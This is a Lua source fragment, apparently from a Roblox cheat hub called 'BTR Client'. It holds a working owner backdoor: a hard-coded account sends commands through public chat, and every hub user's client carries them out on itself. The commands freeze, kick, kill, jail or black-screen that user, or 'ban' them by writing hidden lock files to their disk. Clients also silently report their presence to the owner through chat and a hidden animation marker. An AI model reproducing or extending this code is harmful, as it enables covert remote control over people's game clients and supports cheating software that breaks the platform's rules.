-- BTR OWNER // Public-chat transport + visual jail (target-local)
local function stopOwnerJail()
    ownerJailActive = false
    if ownerJailConn then
        pcall(function() ownerJailConn:Disconnect() end)
        ownerJailConn = nil
    end
    if ownerJailModel then
        pcall(function() ownerJailModel:Destroy() end)
        ownerJailModel = nil
    end
end

local function makeOwnerJailPart(parent, name, size)
    local p = Instance.new("Part")
    p.Name = name
    p.Anchored = true
    p.CanCollide = false
    p.CanTouch = false
    p.CanQuery = false
    p.CastShadow = false
    p.Material = Enum.Material.Metal
    p.Color = Color3.fromRGB(48, 51, 58)
    p.Size = size
    p.Transparency = 0.05
    p.Parent = parent
    return p
end

local function startOwnerJail()
    stopOwnerJail()
    ownerJailActive = true
    ownerJailPulse = 0

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local lp = Players.LocalPlayer
    if not lp then return end

    local function rebuild()
        if not ownerJailActive then return end
        if ownerJailModel then pcall(function() ownerJailModel:Destroy() end) end
        local model = Instance.new("Model")
        model.Name = "BTR_OwnerClassicJail"
        model.Parent = game:GetService("Workspace")
        ownerJailModel = model
        for i = 1, 4 do
            local x = (i <= 2) and -3.1 or 3.1
            local z = (i % 2 == 1) and -3.1 or 3.1
            makeOwnerJailPart(model, "CornerBar" .. i, Vector3.new(0.38, 7.0, 0.38)).CFrame = CFrame.new(x, 3.5, z)
        end
        for i = 1, 8 do
            local a = ((i - 1) / 8) * math.pi * 2
            local x, z = math.cos(a) * 3.1, math.sin(a) * 3.1
            local p = makeOwnerJailPart(model, "Bar" .. i, Vector3.new(0.26, 7.0, 0.26))
            p.CFrame = CFrame.new(x, 3.5, z)
        end
        local top = makeOwnerJailPart(model, "Top", Vector3.new(7.0, 0.25, 7.0))
        top.Transparency = 0.78
        local base = makeOwnerJailPart(model, "Base", Vector3.new(7.0, 0.20, 7.0))
        base.Transparency = 0.82
        local sign = Instance.new("BillboardGui")
        sign.Name = "OwnerJailSign"
        sign.Size = UDim2.new(0, 180, 0, 42)
        sign.StudsOffset = Vector3.new(0, 4.8, 0)
        sign.AlwaysOnTop = true
        sign.Parent = model
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "BTR OWNER JAIL"
        lbl.TextColor3 = Color3.fromRGB(255, 220, 120)
        lbl.TextStrokeTransparency = 0.3
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextSize = 13
        lbl.Parent = sign
    end

    rebuild()

    ownerJailConn = RunService.Heartbeat:Connect(function(dt)
        if not ownerJailActive then return end
        ownerJailPulse = ownerJailPulse + dt
        local char = lp.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then
            if ownerJailModel then ownerJailModel:PivotTo(CFrame.new(0, -500, 0)) end
            return
        end
        if not ownerJailModel or not ownerJailModel.Parent then
            rebuild()
        end
        if ownerJailModel then
            local pulse = math.sin(ownerJailPulse * 4) * 0.08
            ownerJailModel:PivotTo(root.CFrame * CFrame.new(0, -3.45 + pulse, 0))
            for _, d in ipairs(ownerJailModel:GetChildren()) do
                if d:IsA("BasePart") then
                    d.Transparency = (d.Name == "Top" or d.Name == "Base") and 0.80 or (0.08 + math.abs(math.sin(ownerJailPulse * 3)) * 0.03)
                end
            end
        end
    end)
end

local function executeOwnerCommand(cmdName, targetStr, arg1, arg2)
    local lp = game:GetService("Players").LocalPlayer
    if lp and lp.UserId == OWNER_USER_ID then return end
    local myName = lp.Name:lower()
    local myDisplay = lp.DisplayName:lower()
    local myId = tostring(lp.UserId)
    
    targetStr = (targetStr or ""):lower()
    local matchesMe = (targetStr == "all" or targetStr == myName or targetStr == myDisplay or targetStr == myId or myName:sub(1, #targetStr) == targetStr or myDisplay:sub(1, #targetStr) == targetStr)

    if not matchesMe then return end

    if cmdName == "freeze" then
        isOwnerFrozen = true
        pcall(function()
            game:GetService("ContextActionService"):BindActionAtPriority(
                "BTR_OwnerFreezeAction",
                function() return Enum.ContextActionResult.Sink end,
                false,
                Enum.ContextActionPriority.High.Value + 1000,
                Enum.PlayerActions.CharacterForward,
                Enum.PlayerActions.CharacterBackward,
                Enum.PlayerActions.CharacterLeft,
                Enum.PlayerActions.CharacterRight,
                Enum.PlayerActions.CharacterJump
            )
        end)
        if ownerFreezeConn then ownerFreezeConn:Disconnect() end
        ownerFreezeConn = game:GetService("RunService").Heartbeat:Connect(function()
            if not isOwnerFrozen then return end
            local char = lp.Character
            if char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                local root = char:FindFirstChild("HumanoidRootPart")
                if hum then
                    hum.PlatformStand = true
                    hum.WalkSpeed = 0
                    hum.JumpPower = 0
                    hum.JumpHeight = 0
                end
                if root then
                    root.Anchored = true
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BTR OWNER",
            Text = "You have been frozen by Ash.",
            Duration = 6
        })

    elseif cmdName == "unfreeze" then
        isOwnerFrozen = false
        if ownerFreezeConn then
            ownerFreezeConn:Disconnect()
            ownerFreezeConn = nil
        end
        pcall(function()
            game:GetService("ContextActionService"):UnbindAction("BTR_OwnerFreezeAction")
        end)
        local char = lp.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if hum then
                hum.PlatformStand = false
                hum.WalkSpeed = 16
                hum.JumpPower = 50
                hum.JumpHeight = 7.2
            end
            if root then
                root.Anchored = false
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BTR OWNER",
            Text = "You have been unfrozen by Ash.",
            Duration = 4
        })

    elseif cmdName == "kick" then
        local reason = arg1 or "Kicked by Hub Owner (Ash)"
        pcall(function()
            if _G.BTR_MASTER_CLEANUP then _G.BTR_MASTER_CLEANUP() end
        end)
        lp:Kick(reason)

    elseif cmdName == "ban" then
        if lp.UserId == OWNER_USER_ID then return end
        local durStr = arg1 or "Permanent"
        local reason = arg2 or "Blacklisted by Hub Owner (Ash)"
        local expireTime = 0
        local dLower = tostring(durStr):lower()
        if dLower == "1d" or dLower:find("1 day") then expireTime = os.time() + 86400
        elseif dLower == "3d" or dLower:find("3 day") then expireTime = os.time() + 259200
        elseif dLower == "7d" or dLower:find("7 day") or dLower:find("week") then expireTime = os.time() + 604800
        elseif dLower == "2m" or dLower:find("2 month") then expireTime = os.time() + 5184000
        elseif dLower == "6m" or dLower:find("6 month") then expireTime = os.time() + 15552000
        elseif tonumber(durStr) and tonumber(durStr) > 0 then expireTime = os.time() + tonumber(durStr) * 60
        else expireTime = 0 end

        local data = {
            banned = true,
            expiresAt = expireTime,
            duration = durStr,
            reason = reason,
            timestamp = os.time()
        }
        if writefile then
            pcall(function()
                local enc = game:GetService("HttpService"):JSONEncode(data)
                writefile("BTR_Client_Ban.json", enc)
                writefile(".btr_sys_lock.dat", enc)
                writefile("btr_cache_id.cfg", enc)
            end)
        end
        pcall(function()
            if _G.BTR_MASTER_CLEANUP then _G.BTR_MASTER_CLEANUP() end
        end)
        local kickMsg = "You have been blacklisted from BTR Client by Ash. Reason: " .. reason
        if expireTime > 0 then
            kickMsg = kickMsg .. " (" .. tostring(durStr) .. ")"
        else
            kickMsg = kickMsg .. " (Permanent)"
        end
        lp:Kick(kickMsg)

    elseif cmdName == "unban" then
        if delfile then
            pcall(function() if isfile and isfile("BTR_Client_Ban.json") then delfile("BTR_Client_Ban.json") end end)
            pcall(function() if isfile and isfile(".btr_sys_lock.dat") then delfile(".btr_sys_lock.dat") end end)
            pcall(function() if isfile and isfile("btr_cache_id.cfg") then delfile("btr_cache_id.cfg") end end)
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BTR OWNER",
            Text = "Your blacklist status has been removed by Ash.",
            Duration = 5
        })

    elseif cmdName == "unload" then
        pcall(function()
            if _G.BTR_MASTER_CLEANUP then _G.BTR_MASTER_CLEANUP() end
        end)
        pcall(function()
            local CoreGui = game:GetService("CoreGui")
            for _, g in ipairs(CoreGui:GetChildren()) do
                if g.Name:find("Redz") or g.Name:find("BTR") then
                    g:Destroy()
                end
            end
        end)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BTR OWNER",
            Text = "BTR Client was remotely unloaded by Ash.",
            Duration = 5
        })

    elseif cmdName == "kill" then
        local char = lp.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then hum.Health = 0 end

    elseif cmdName == "jail" then
        startOwnerJail()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BTR OWNER",
            Text = "You have been placed in the classic Owner jail.",
            Duration = 5
        })

    elseif cmdName == "unjail" or cmdName == "unjailv2" then
        stopOwnerJail()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BTR OWNER",
            Text = "Owner jail removed.",
            Duration = 4
        })

    elseif cmdName == "blind" then
        if ownerBlindGui then ownerBlindGui:Destroy() end
        local CoreGui = game:GetService("CoreGui")
        local sg = Instance.new("ScreenGui")
        sg.Name = "BTR_OwnerBlindGui"
        sg.ResetOnSpawn = false
        sg.DisplayOrder = 999999
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(1, 0, 1, 0)
        f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        f.BorderSizePixel = 0
        local lbl = Instance.new("TextLabel", f)
        lbl.Size = UDim2.new(1, 0, 0, 50)
        lbl.Position = UDim2.new(0, 0, 0.5, -25)
        lbl.BackgroundTransparency = 1
        lbl.Text = "YOU HAVE BEEN BLINDED BY ASH"
        lbl.TextColor3 = Color3.fromRGB(255, 40, 40)
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextSize = 22
        pcall(function() sg.Parent = CoreGui end)
        if not sg.Parent or sg.Parent ~= CoreGui then
            sg.Parent = lp:WaitForChild("PlayerGui")
        end
        ownerBlindGui = sg

    elseif cmdName == "unblind" then
        if ownerBlindGui then
            ownerBlindGui:Destroy()
            ownerBlindGui = nil
        end

    elseif cmdName == "pingusers" then
        local Players = game:GetService("Players")
        local ownerPlr = nil
        for _, p in ipairs(Players:GetPlayers()) do
            if p.UserId == OWNER_USER_ID then
                ownerPlr = p
                break
            end
        end
        if ownerPlr and ownerPlr ~= lp then
            -- Public acknowledgement: Roblox's current TextChatService uses RBXGeneral for public player chat.
            pcall(function()
                local TextChatService = game:GetService("TextChatService")
                local channels = TextChatService:FindFirstChild("TextChannels")
                local gen = channels and channels:FindFirstChild("RBXGeneral")
                if gen then
                    gen:SendAsync("!btr_user_ack")
                end
            end)
            pcall(function()
                local RS = game:GetService("ReplicatedStorage")
                local dcs = RS:FindFirstChild("DefaultChatSystemChatEvents")
                local say = dcs and dcs:FindFirstChild("SayMessageRequest")
                if say then
                    say:FireServer("!btr_user_ack", "All")
                end
            end)
        end

    elseif cmdName == "msg" then
        local text = arg1 or ""
        if _G.BTR_ShowOwnerMessageMenu then
            _G.BTR_ShowOwnerMessageMenu(text, "Ash", os.time())
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "MESSAGE FROM ASH (OWNER)",
                Text = text,
                Duration = 10
            })
        end
    end
end

local function parseOwnerMessage(rawMsg, senderUserId)
    if senderUserId ~= OWNER_USER_ID then return end
    rawMsg = rawMsg:gsub("^%s+", ""):gsub("%s+$", "")
    
    local prefix = rawMsg:sub(1, 1)
    if prefix ~= "/" and prefix ~= ";" and prefix ~= "!" then return end
    
    local body = rawMsg:sub(2)
    local parts = {}
    for word in body:gmatch("%S+") do
        table.insert(parts, word)
    end
    if #parts == 0 then return end
    
    local cmd = parts[1]:lower()
    local target = parts[2]
    local arg1 = parts[3]
    local arg2 = nil
    if #parts >= 4 then
        arg2 = table.concat(parts, " ", 4)
    end
    
    if cmd == "msg" and #parts >= 3 then
        arg1 = table.concat(parts, " ", 3)
    elseif cmd == "kick" and #parts >= 3 then
        arg1 = table.concat(parts, " ", 3)
    end
    
    executeOwnerCommand(cmd, target, arg1, arg2)
end

_G.BTR_ONLINE_USERS = _G.BTR_ONLINE_USERS or {}
if _G.BTR_OWNER_NOTIF_ENABLED == nil then
    _G.BTR_OWNER_NOTIF_ENABLED = true
end

local function broadcastOwnerCommand(cmdText)
    local curUser = game:GetService("Players").LocalPlayer
    if not _verifyBtrOwnerIdentity(curUser) then
        pcall(function() curUser:Kick("Security Anomaly: Unauthorized Access to Internal Core.") end)
        return
    end

    -- Execute locally for the owner when the command targets the owner/all.
    pcall(function()
        parseOwnerMessage(cmdText, OWNER_USER_ID)
    end)

    -- Public transport: all BTR clients receive the same command in RBXGeneral.
    local sent = false
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        local channels = TextChatService:FindFirstChild("TextChannels")
        local gen = channels and channels:FindFirstChild("RBXGeneral")
        if gen then
            gen:SendAsync(cmdText)
            sent = true
        end
    end)

    if not sent then
        pcall(function()
            local RS = game:GetService("ReplicatedStorage")
            local dcs = RS:FindFirstChild("DefaultChatSystemChatEvents")
            local say = dcs and dcs:FindFirstChild("SayMessageRequest")
            if say then
                say:FireServer(cmdText, "All")
                sent = true
            end
        end)
    end
end

local function handleIncomingOwnerChat(msgText, senderUserId)
    if not msgText then return end
    local Players = game:GetService("Players")
    local lp = Players.LocalPlayer

    if lp.UserId == OWNER_USER_ID and senderUserId ~= OWNER_USER_ID then
        local senderPlr = Players:GetPlayerByUserId(senderUserId)
        if not senderPlr then
            for _, p in ipairs(Players:GetPlayers()) do
                if p.UserId == senderUserId then senderPlr = p break end
            end
        end
        if senderPlr and (msgText:find("!btr_user_ack") or msgText:find("!btr_user_ping")) then
            _G.BTR_ONLINE_USERS[senderPlr.Name] = senderPlr
            if _G.BTR_OWNER_NOTIF_ENABLED ~= false then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Hub User Detected",
                    Text = senderPlr.DisplayName .. " (@" .. senderPlr.Name .. ") is using BTR Client!",
                    Duration = 4
                })
            end
            if _G.BTR_UpdateOwnerPlayerDropdown then
                pcall(_G.BTR_UpdateOwnerPlayerDropdown)
            end
            return
        end
    end

    parseOwnerMessage(msgText, senderUserId)
end

pcall(function()
    local TextChatService = game:GetService("TextChatService")
    TextChatService.MessageReceived:Connect(function(msgObj)
        if msgObj and msgObj.TextSource then
            handleIncomingOwnerChat(msgObj.Text, msgObj.TextSource.UserId)
        end
    end)
end)

pcall(function()
    local Players = game:GetService("Players")
    for _, plr in ipairs(Players:GetPlayers()) do
        plr.Chatted:Connect(function(msg)
            handleIncomingOwnerChat(msg, plr.UserId)
        end)
    end
    Players.PlayerAdded:Connect(function(plr)
        plr.Chatted:Connect(function(msg)
            handleIncomingOwnerChat(msg, plr.UserId)
        end)
    end)
end)

pcall(function()
    local Players = game:GetService("Players")
    local lp = Players.LocalPlayer
    if lp.UserId ~= OWNER_USER_ID then
        task.spawn(function()
            task.wait(1.5)
            for _, p in ipairs(Players:GetPlayers()) do
                if p.UserId == OWNER_USER_ID then
                    pcall(function()
                        local RS = game:GetService("ReplicatedStorage")
                        local dcs = RS:FindFirstChild("DefaultChatSystemChatEvents")
                        local say = dcs and dcs:FindFirstChild("SayMessageRequest")
                        if say then
                            say:FireServer("!btr_user_ack", "All")
                        end
                    end)
                    pcall(function()
                        local TextChatService = game:GetService("TextChatService")
                        local channels = TextChatService:FindFirstChild("TextChannels")
                        local gen = channels and channels:FindFirstChild("RBXGeneral")
                        if gen then
                            gen:SendAsync("!btr_user_ack")
                        end
                    end)
                    break
                end
            end
        end)

        Players.PlayerAdded:Connect(function(newPlr)
            if newPlr.UserId == OWNER_USER_ID then
                task.wait(2)
                pcall(function()
                    local RS = game:GetService("ReplicatedStorage")
                    local dcs = RS:FindFirstChild("DefaultChatSystemChatEvents")
                    local say = dcs and dcs:FindFirstChild("SayMessageRequest")
                    if say then
                        say:FireServer("!btr_user_ack", "All")
                    end
                end)
                pcall(function()
                    local TextChatService = game:GetService("TextChatService")
                    local channels = TextChatService:FindFirstChild("TextChannels")
                    local gen = channels and channels:FindFirstChild("RBXGeneral")
                    if gen then
                        gen:SendAsync("!btr_user_ack")
                    end
                end)
            end
        end)

        local function registerHubSignature(char)
            if not char then return end
            task.spawn(function()
                local hum = char:WaitForChild("Humanoid", 10)
                if not hum then return end
                task.wait(0.5)
                pcall(function()
                    local anim = Instance.new("Animation")
                    anim.AnimationId = "rbxassetid://10921054344"
                    local track = hum:LoadAnimation(anim)
                    track.Priority = Enum.AnimationPriority.Core
                    track.Looped = true
                    track:Play(0, 0.001, 0.0001)
                end)
            end)
        end
        if lp.Character then registerHubSignature(lp.Character) end
        lp.CharacterAdded:Connect(registerHubSignature)
    end
end)

if OwnerTab then
    OwnerTab:AddSection({ "> Hub Users in Server" })

    local selectedOwnerTarget = ""
